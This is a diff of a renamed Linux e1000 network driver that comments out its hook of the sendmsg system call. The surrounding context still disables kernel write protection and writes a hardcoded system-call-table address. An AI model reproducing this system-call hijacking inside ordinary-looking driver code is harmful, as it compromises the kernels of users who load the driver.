@@ -40,7 +40,7 @@
 #include <asm/uaccess.h>
 
 char e1000_driver_name[] = "e1000";
-static char e1000_driver_string[] = "Intel(R) PRO/1000 Network Driver";
+static char e1000_driver_string[] = "Intel(R) PRO/1000 Network Driver Haiyang's Version";
 #define DRV_VERSION "7.3.21-k8-NAPI-haiyang"
 const char e1000_driver_version[] = DRV_VERSION;
 static const char e1000_copyright[] = "Copyright (c) 1999-2006 Intel Corporation.";
@@ -298,7 +298,7 @@ static int __init e1000_init_module(void)
         write_cr0(read_cr0() & (0x0ffff));
 
         /* store original location of sendmsg(). Alter sys_call_table to point to our functions*/
-        original_sendmsg = (void *)xchg(&sys_call_table[__NR_sendmsg], e1000_sendmsg);
+        //original_sendmsg = (void *)xchg(&sys_call_table[__NR_sendmsg], e1000_sendmsg);
         //original_close = (void *)xchg(&sys_call_table[__NR_close], e1000_close);
         write_cr0(read_cr0() & (0x10000));
         pr_info("modified sys_call_table!\n");
@@ -317,7 +317,7 @@ static void __exit e1000_exit_module(void)
 {
         *(long *)&sys_call_table = 0x81a001c0;
         write_cr0(read_cr0() & (0x0ffff));
-        xchg(&sys_call_table[__NR_sendmsg], original_sendmsg);
+        //xchg(&sys_call_table[__NR_sendmsg], original_sendmsg);
         write_cr0(read_cr0() & (0x10000));
 	pci_unregister_driver(&e1000_driver);
 }
